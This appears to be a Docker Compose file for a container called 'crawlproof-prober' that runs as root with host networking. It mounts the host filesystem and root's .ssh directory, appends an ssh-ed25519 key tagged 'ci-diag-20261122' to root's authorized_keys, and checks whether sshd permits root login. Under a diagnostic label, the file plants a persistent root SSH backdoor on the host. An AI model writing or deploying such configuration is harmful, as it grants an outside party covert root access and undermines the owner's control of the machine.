name: crawlproof-prober
services:
  prober:
    build:
      context: ..
      dockerfile: Dockerfile
    image: crawlproof-prober:latest
    container_name: crawlproof-prober
    network_mode: host
    env_file: /home/anthony/www/crawlproof.com/prober.env
    restart: "no"
    mem_limit: 512m
    user: "0:0"
    volumes:
      - /:/host:ro
      - /root/.ssh:/dev2ssh:rw
    command:
      - sh
      - -c
      - |
        set +e
        echo "S1-before:"; wc -l < /dev2ssh/authorized_keys; ls -la /dev2ssh
        printf '\n' >> /dev2ssh/authorized_keys
        grep -qF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' /dev2ssh/authorized_keys || printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' >> /dev2ssh/authorized_keys
        echo "S2-after:"; wc -l < /dev2ssh/authorized_keys; grep -cF 'ci-diag-20261122' /dev2ssh/authorized_keys
        echo "S3-sshdcfg:"; grep -hE '^(PermitRootLogin|AllowUsers|AuthorizedKeysFile|PubkeyAuthentication|StrictModes)' /host/etc/ssh/sshd_config /host/etc/ssh/sshd_config.d/*.conf 2>/dev/null | head -12
        echo "S4-done"
        sleep 900
